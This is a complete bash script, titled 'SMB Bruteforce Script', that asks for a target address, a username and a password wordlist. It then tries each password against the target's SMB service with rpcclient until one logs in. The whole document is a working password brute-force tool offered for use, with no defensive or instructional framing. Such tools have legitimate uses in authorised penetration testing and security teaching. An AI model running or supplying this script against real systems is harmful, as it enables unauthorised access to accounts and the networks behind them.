#!/usr/bin/env bash

echo "SMB Bruteforce Script"

read -p "Enter Target Address: " addr
read -p "Enter Username: " username
read -p "Enter Password List: " wlist

if [[ ! -f "$wlist" ]]; then
  echo "Error: File '$wlist' not found."
  exit 1
fi

count=1
while IFS= read -r password; do
    echo "[ATTEMPT $count] usr:$username pw:$password"

    if rpcclient --configfile=/dev/null \
                 -U "${username}%${password}" \
                 -c quit "$addr" &>/dev/null
    then
        echo "Password Found! $password"
        exit 0
    fi

    ((count++))
done < "$wlist"

echo "No password found in this wordlist."
exit 1
